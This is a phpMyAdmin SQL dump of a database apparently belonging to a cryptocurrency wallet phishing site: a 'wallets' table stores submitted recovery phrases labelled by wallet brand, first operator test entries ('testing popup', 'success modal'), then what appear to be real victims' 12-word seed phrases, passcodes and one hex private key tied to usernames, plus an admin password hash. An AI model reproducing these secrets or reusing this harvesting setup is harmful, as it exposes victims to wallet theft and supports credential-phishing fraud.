-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Mar 29, 2025 at 07:41 PM
-- Server version: 8.0.41-cll-lve
-- PHP Version: 8.3.15

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `quantu18_connect`
--

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int NOT NULL,
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `role` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `email`, `password`, `role`) VALUES
(2, 'Admin', '$2y$10$UVKloWg5Wd1d9KxlMIeDKemOkMu3m30uk/kyOeQv4AC8z9GmcSySq', 'admin');

-- --------------------------------------------------------

--
-- Table structure for table `wallets`
--

CREATE TABLE `wallets` (
  `id` int NOT NULL,
  `load_phrase` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `data_phrase` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `wallet_selected` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT 'Unknown User'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wallets`
--

INSERT INTO `wallets` (`id`, `load_phrase`, `data_phrase`, `wallet_selected`, `created_at`, `username`) VALUES
(110, '1', 'test test test test tes test test test test test test test test test test', 'Unstoppable Wallet', '2024-09-06 04:23:27', 'Unknown User'),
(113, '1', 'ewgbjflkg,.vwfbffadsv', 'ledger', '2024-11-09 21:35:39', 'Unknown User'),
(114, '1', 'ppppp', 'Metamask', '2024-11-09 21:45:35', 'Unknown User'),
(115, '1', 'zzzz', 'Metamask', '2024-11-09 21:54:11', 'Unknown User'),
(116, '1', 'last test', 'Wallet Connect', '2024-11-09 23:35:44', 'Unknown User'),
(117, '1', 'clap,  honey, charge, phone, green, glow, grass, moist, paper, truck,  stitch, water,', 'Trust Wallet', '2024-11-09 23:53:39', 'Unknown User'),
(118, '1', 'clap,  honey, charge, phone, green, glow, grass, moist, paper, truck,  stitch, water', 'Trust Wallet', '2024-11-09 23:55:15', 'Unknown User'),
(119, '1', 'testing', 'Metamask', '2024-11-10 19:39:18', 'Unknown User'),
(121, '1', 'a a a a a a a a a a a a', 'Trust Wallet', '2024-11-10 20:40:30', 'Unknown User'),
(122, '1', 'a a a a a a a a a a a a', 'Trust Wallet', '2024-11-10 20:42:02', 'Unknown User'),
(123, '1', 'nnnnnnnnnn', 'MetaMask', '2024-11-10 20:44:17', 'Unknown User'),
(124, '1', 'bnmmnmyuio', 'Metamask', '2024-11-10 21:28:49', 'Unknown User'),
(125, '1', 'rfgsdhjasdfd', 'Metamask', '2024-11-10 21:57:09', 'Unknown User'),
(126, '1', 'tdcgwgdag', 'Metamask', '2024-11-11 12:40:05', 'Unknown User'),
(127, '1', 'dfghjk', 'Metamask', '2024-11-11 14:49:39', 'Unknown User'),
(128, '1', 'teststt', 'Wallet Connect', '2024-11-11 18:29:35', 'Unknown User'),
(129, '1', 'connected', 'Metamask', '2024-11-11 18:42:21', 'Unknown User'),
(130, '1', 'con', 'Metamask', '2024-11-11 19:28:46', 'Unknown User'),
(131, '1', 'Yeah yeah yeah yeah yeah yeah yeah yeah yeah yeah yeah yeah', 'Trust Wallet', '2024-11-11 19:31:40', 'Unknown User'),
(133, '1', 'Yeah yeah yeah yeah yeah yeah yeah yeah yegg yeah yeah yegg', 'Exodus wallet', '2024-11-11 23:55:33', 'Unknown User'),
(134, '1', 'Yh yh yh yh yh yh yh yh yh yh yh yh', 'Trust Wallet', '2024-11-12 06:41:15', 'Unknown User'),
(135, '1', 'Yh yh yh yh yh yh yh', 'Exodus wallet', '2024-11-12 12:57:30', 'Unknown User'),
(136, '1', 'whip rural thrive edit absorb letter rely record patrol wall finger spoon', 'Exodus wallet', '2024-11-12 13:05:58', 'Unknown User'),
(137, '1', 'whip rural thrive edit absorb letter rely \nrecord patrol wall finger spoon', 'Exodus wallet', '2024-11-12 14:55:19', 'Unknown User'),
(138, '1', 'testing smtp', 'Metamask', '2024-11-12 17:39:37', 'Unknown User'),
(139, '1', 'testing popup', 'KEPLR', '2024-11-12 18:12:33', 'Unknown User'),
(140, '1', 'success modal', 'SaitaMask', '2024-11-12 18:14:51', 'Unknown User'),
(141, '1', 'modal final tesst', 'SaitaMask', '2024-11-12 18:16:38', 'Unknown User'),
(142, '1', 'Giana’s shaman again. Shark Ajman’s us isn’t', 'Coinbase', '2024-11-12 18:42:13', 'Unknown User'),
(143, '1', 'Giana’s shaman again. Shark Ajman’s us isn’t  good day gentlemen', 'ledger', '2024-11-12 18:44:36', 'Unknown User'),
(144, '1', 'Yea yea yea yea yea yea yea yea yea yea yea yea', 'Exodus wallet', '2024-11-12 18:51:27', 'Unknown User'),
(145, '1', 'green, stitch, moist, charge, water, grass, paper, glow, honey, phone, clap, truck', 'Exodus wallet', '2024-11-12 21:19:59', 'Unknown User'),
(146, '1', 'green, stitch, moist, charge, water, grass, paper, glow, honey, phone, clap, truck', 'ledger', '2024-11-12 21:30:30', 'Unknown User'),
(147, '1', 'flip, crop, scrap, unable, cravd, source, embrace, major, ordinary, squirrel, profit', 'Exodus wallet', '2024-11-12 21:34:16', 'Unknown User'),
(148, '1', 'green, stitch, moist, charge, water, grass, paper, glow, honey, phone, clap, truck', 'Exodus wallet', '2024-11-12 21:38:42', 'Unknown User'),
(149, '1', 'flip, crop, scrap, unable, execute, crowd, source, embrace, major, ordinary, squirrel, profit', 'Exodus wallet', '2024-11-12 21:50:16', 'Unknown User'),
(150, '1', 'flip, crop, scrap, unable, execute, crowd, source, embrace, major, ordinary, squirrel, profit', 'Exodus wallet', '2024-11-12 21:55:09', 'Unknown User'),
(151, '1', 'green, stitch, moist, change, water, grass, paper, glow, hon', 'Exodus wallet', '2024-11-12 21:58:05', 'Unknown User'),
(152, '1', 'green, stitch, moist, change, water, grass, paper, glow, honey, phone, clap, truck', 'Exodus wallet', '2024-11-12 21:58:51', 'Unknown User'),
(153, '1', 'Uncover action zebra chalk social able mad pond wall tip seminar rebel', 'Coinbase', '2024-11-15 15:17:14', 'Unknown User'),
(154, '1', 'whip, rural ,thrive , edit , absorb , letter , rely , record , patrol , wall , finger , spoon', 'Exodus wallet', '2024-11-15 20:18:17', 'Unknown User'),
(155, '1', 'Hedgehog scale any tribe retire alpha rib divorce error drink boost alone', 'Exodus wallet', '2024-11-16 15:50:17', 'Unknown User'),
(156, '1', 'Frame accident noble term duty siege connect sunset cat regular whale dumb', 'Trust Wallet', '2024-11-18 02:39:50', 'Unknown User'),
(157, '1', 'Frame accident noble term duty siege connect sunset cat regular whale dumb', 'Trust Wallet', '2024-11-18 02:40:36', 'Unknown User'),
(158, '1', 'Frame accident noble term duty siege connect sunset cat regular whale dumb', 'Trust Wallet', '2024-11-18 02:42:23', 'Unknown User'),
(159, '1', 'Stairs step table puppy six exhaust noodle tobacco airport dilemma hawk erase', 'Exodus wallet', '2024-11-18 18:32:13', 'Unknown User'),
(160, '1', 'Stairs step table puppy six exhaust noodle tobacco airport dilemma hawk erase', 'Exodus wallet', '2024-11-18 18:37:10', 'Unknown User'),
(161, '1', 'Route sphere job view scrap isolate uphold chase pattern about call rail', 'Trust Wallet', '2024-11-18 18:59:16', 'Unknown User'),
(162, '1', 'Amateur myself attract cereal tobacco lab west prison saddle cover access stumble', 'Exodus wallet', '2024-11-18 20:29:13', 'Unknown User'),
(163, '1', 'Amateur myself attract cereal tobacco lab west prison saddle cover access stumble', 'Exodus wallet', '2024-11-18 20:32:44', 'Unknown User'),
(164, '1', 'stitch, phone, moist, water,  honey, green, truck, paper, grass, charge, glow, clap,', 'Exodus wallet', '2024-11-25 00:19:12', 'Unknown User'),
(165, '1', 'neck, harsh, stomach, deny, screen, puppy, slim, later, canyon, autumn, south, indicate,', 'Exodus wallet', '2024-11-25 00:32:25', 'Unknown User'),
(166, '1', 'Cloud, labor, brush, rebuild, issue, second, palm, theory, task, curtain, segment, stereo', 'Exodus wallet', '2024-11-26 18:26:32', 'Unknown User'),
(167, '1', 'Cloud, labor, brush, rebuild, issue, second, palm, theory, task, curtain, segment, stereo', 'Exodus wallet', '2024-11-26 18:32:38', 'Unknown User'),
(168, '1', 'RXWq$!q6ExL8kgt', 'Coinbase', '2024-11-29 05:52:08', 'Unknown User'),
(169, '1', 'RXWq$!q6ExL8kgt', 'Coinbase', '2024-11-29 05:52:22', 'Unknown User'),
(170, '1', 'RXWq$!q6ExL8kgt', 'Coinbase', '2024-11-29 06:03:39', 'Unknown User'),
(171, '1', 'RXWq$!q6ExL8kgt', 'Coinbase', '2024-11-29 06:16:26', 'Unknown User'),
(172, '1', '011065', 'Trust Wallet', '2024-11-29 17:57:24', 'Unknown User'),
(173, '1', 'hair wise bomb bottom door kitchen fluid fruit work wrong warfare below', 'Trust Wallet', '2024-11-29 20:55:29', 'Unknown User'),
(174, '1', 'dolphin give swamp live grunt rally addict monkey program orphan popular alter', 'Exodus wallet', '2024-12-02 16:27:41', 'Unknown User'),
(175, '1', 'float hawk effort traffic reunion melt retire grab play advice cruise donate', 'Exodus wallet', '2024-12-03 01:03:35', 'Unknown User'),
(176, '1', 'a', 'Exodus wallet', '2024-12-03 01:03:48', 'Unknown User'),
(177, '1', 'asdf', '', '2024-12-03 01:15:23', 'Unknown User'),
(178, '1', 'toe canyon inject caution crack future humor wasp chunk exotic tomato sorry', 'Exodus wallet', '2024-12-08 13:32:26', 'Unknown User'),
(179, '1', 'Eight antique submit orange sugar disease way tired agree afford fresh fashion', 'Exodus wallet', '2024-12-12 04:16:55', 'Unknown User'),
(180, '1', 'milk carbon utility juice exhaust wonder dignity urban melody upper daughter naive', 'Trust Wallet', '2025-01-14 00:19:30', 'Unknown User'),
(181, '1', 'milk carbon utility juice exhaust wonder dignity urban melody upper daughter naive', 'Trust Wallet', '2025-01-14 01:05:26', 'Unknown User'),
(182, '1', 'water,horn,delay,matter,zone,clap, deliver,foster,rebel,become,where,\nsocial', 'Exodus wallet', '2025-01-28 20:29:41', 'Unknown User'),
(183, '1', 'truck,grass,moist,stich,glow,honey,\ncharge,clap,water,phone,paper,green', 'XRP', '2025-01-29 23:35:44', 'Unknown User'),
(184, '1', 'testing', 'Metamask', '2025-02-01 17:47:40', 'Unknown User'),
(185, '1', 'testing 2', 'ledger', '2025-02-01 18:31:54', 'Unknown User'),
(186, '1', 'hope thois works', 'ledger', '2025-02-01 18:46:13', 'Unknown User'),
(187, '1', 'testing', 'Metamask', '2025-02-01 18:57:57', 'Unknown User'),
(188, '1', 'testing gjekfe ergjkejkgnqn rgklneg er rgregerg', 'Metamask', '2025-02-01 18:58:16', 'Unknown User'),
(189, '1', 'will work', 'Binance Chain Wallet', '2025-02-01 19:25:50', 'Unknown User'),
(190, '1', 'will work', 'Binance Chain Wallet', '2025-02-01 19:26:12', 'Unknown User'),
(191, '1', 'tseesfewsc', 'Xumm Wallet', '2025-02-01 19:31:52', 'Unknown User'),
(192, '1', 'water,horn,delay,matter,zone,clap\ndeliver,foster,rebel,become,where,\nsocial', 'Exodus wallet', '2025-02-02 14:21:54', 'Unknown User'),
(193, '1', 'water,horn,delay,matter,zone,clap,\ndeliver,foster,rebel,become,where,\nsocial', 'Exodus wallet', '2025-02-02 21:00:22', 'Unknown User'),
(194, 'testing today', 'testing today', 'ledger', '2025-02-05 16:51:53', 'Unknown User'),
(195, 'testintt', 'testintt', 'Metamask', '2025-02-05 16:59:41', 'Unknown User'),
(196, '1', 'testing', 'Wallet Connect', '2025-02-05 17:00:43', 'Unknown User'),
(197, '1', 'testing 444', 'SaitaMask', '2025-02-05 17:01:57', 'Unknown User'),
(198, '1', 'testttt', 'Binance Chain Wallet', '2025-02-05 19:24:52', 'Unknown User'),
(199, '1', 'bitpay test', 'Bitpay', '2025-02-05 21:22:17', 'Unknown User'),
(200, '1', 'testtt99', 'Metamask', '2025-02-06 14:48:15', 'Unknown User'),
(201, '1', 'meta testttt', 'Metamask', '2025-02-06 14:54:20', 'annfancher'),
(202, '1', 'xaman', 'Xaman Wallet', '2025-02-13 05:38:13', 'annfancher'),
(203, '1', 'dywrutuwt5jw', 'Metamask', '2025-02-16 17:15:30', 'Unknown User'),
(204, '1', 'Hockey steel riot abuse life grain purpose art copper wish diagram misery', 'Exodus wallet', '2025-02-22 10:11:22', 'Lukehawk175'),
(205, '1', 'Hockey steel riot abuse life grain purpose art copper wish diagram misery', 'Exodus wallet', '2025-02-22 10:13:49', 'Lukehawk175'),
(206, '1', 'Hockey steel riot abuse life grain purpose art copper wish diagram misery', 'Exodus wallet', '2025-02-22 10:38:54', 'Lukehawk175'),
(207, '1', 'Hockey steel riot abuse life grain purpose art copper wish diagram misery', 'Exodus wallet', '2025-02-22 14:32:03', 'Lukehawk175'),
(208, '1', '0xa12fafbdd028e6defdf1c2400a2084485c2f7ce0284443f667d21fc7f4cdff49', 'Exodus wallet', '2025-02-22 14:43:15', 'Lukehawk175'),
(209, '1', 'friend build educate destroy path shock country\nmail unaware furnace grace\nmultiply', 'Exodus wallet', '2025-03-08 13:37:00', 'Cerame'),
(210, '1', 'friend educate path country unaware grace build destroy shock mail furnace multiply', 'Exodus wallet', '2025-03-08 14:00:38', 'Cerame'),
(211, '1', 'clarify catch glare dignity shove lunar hill devote amateur mandate deny pumpkin', 'Exodus wallet', '2025-03-14 12:45:23', 'Vanessa'),
(212, '1', 'Drop Page Debate Lemon Music Welcome Seminar Amateur Laptop Direct Bus Polar', 'Exodus wallet', '2025-03-15 13:22:59', 'Morphological Sheep'),
(213, '1', 'Drop Page Debate Lemon Music Welcome Seminar Amateur Laptop Direct Bus Polar', 'Exodus wallet', '2025-03-15 13:23:15', 'Morphological Sheep'),
(214, '1', '901691', 'Exodus wallet', '2025-03-16 20:12:26', 'Warpupj'),
(215, '1', '901691', 'Exodus wallet', '2025-03-16 20:13:30', 'Warpupj'),
(216, '1', '901691', 'Exodus wallet', '2025-03-16 20:16:14', 'Warpupj'),
(217, '1', 'Scorpion pole what purity pepper hurt spare little abandon lizard bag tag', 'Exodus wallet', '2025-03-16 20:21:40', 'Warpupj'),
(218, '1', 'testing moonpay', 'moonpay', '2025-03-24 23:48:54', 'annfancher'),
(219, '1', 'Tales stove groom nurse wife’s snake juice shoes charm frame screw couch', 'moonpay', '2025-03-25 09:22:52', 'Julie666'),
(220, '1', 'Tales groom wifes juice charm screw stove nurse snake shoes frame couch', 'moonpay', '2025-03-25 10:59:30', 'Julie666'),
(221, '1', 'tales groom wife’s juice charm screw stove nurse snake shoes frame couch', 'moonpay', '2025-03-25 11:02:48', 'Julie666'),
(222, '1', 'tales stove groom nurse wife’s snake juice shoes charm frame screw couch', 'moonpay', '2025-03-25 11:07:04', 'Julie666'),
(223, '1', 'foot traffic garment rebuild income embody embark filter mask popular genre promote', 'moonpay', '2025-03-25 12:06:56', 'Julie666'),
(224, '1', 'Fruit\nTalent\nCome\nLeisure\nMuffin\nUnhappy\nAcross\nExpire\nBurden\nHobby\nAntique\nAbuse', 'Exodus wallet', '2025-03-26 02:04:22', 'abivi'),
(225, '1', 'Fruit\nTalent\nCome\nLeisure\nMuffin\nUnhappy\nAcross\nExpire\nBurden\nHobby\nAntique\nAbuse', 'Exodus wallet', '2025-03-26 02:10:29', 'abivi'),
(226, '1', 'Grant\nWeb\nDefine\nBook\nDetail\nTimber\nSolution \nNet\nDiscover\nApart\nTell\nOutdoor', 'Exodus wallet', '2025-03-26 02:24:45', 'Rgman1984'),
(227, '1', 'Fruit\nTalent\nCome\nLeisure\nMuffin\nUnhappy\nAcross\nExpire\nBurden\nHobby\nAntique\nAbuse', 'Coinbase', '2025-03-26 11:05:04', 'abivi'),
(228, '1', 'Fruit\nTalent\nCome\nLeisure\nMuffin\nUnhappy\nAcross\nExpire\nBurden\nHobby\nAntique\nAbuse', 'Coinbase Wallet', '2025-03-26 11:05:27', 'abivi'),
(229, '1', 'Fruit\nTalent\nCome\nLeisure\nMuffin\nUnhappy\nAcross\n Expire\nBurden\nHobby\nAntique\nAbuse', 'Coinbase', '2025-03-27 22:47:39', 'abivi'),
(230, '1', 'Fruit\nTalent\nCome\nLeisure\nMuffin\nUnhappy\nAcross\n Expire\nBurden\nHobby\nAntique\nAbuse', 'Coinbase Wallet', '2025-03-27 22:48:08', 'abivi'),
(231, '1', 'tuition \nheight \nbecome \nusual\nbarely \nscreen \nflavor\n test \nkiss \nleisure \ncelery\n secret', 'Coinbase Wallet', '2025-03-27 23:25:02', 'abivi'),
(232, '1', 'tuition \nheight \nbecome \nusual\nbarely \nscreen \nflavor\n test \nkiss \nleisure \ncelery\n secret', 'Coinbase Wallet', '2025-03-27 23:27:55', 'abivi'),
(233, '1', 'oyster sibling drip cinnamon cook butter craft sister vendor crumble young burden', 'Exodus wallet', '2025-03-28 13:36:01', 'MajeddR1'),
(234, '1', 'joewalsh1941', 'Exodus wallet', '2025-03-28 21:08:34', 'Ja1941'),
(235, '1', 'Charge phone moist\nStitch truck water grass\nPaper glow  honey green\nClap', 'Exodus wallet', '2025-03-29 08:44:11', 'Ja1941');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wallets`
--
ALTER TABLE `wallets`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `wallets`
--
ALTER TABLE `wallets`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=236;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
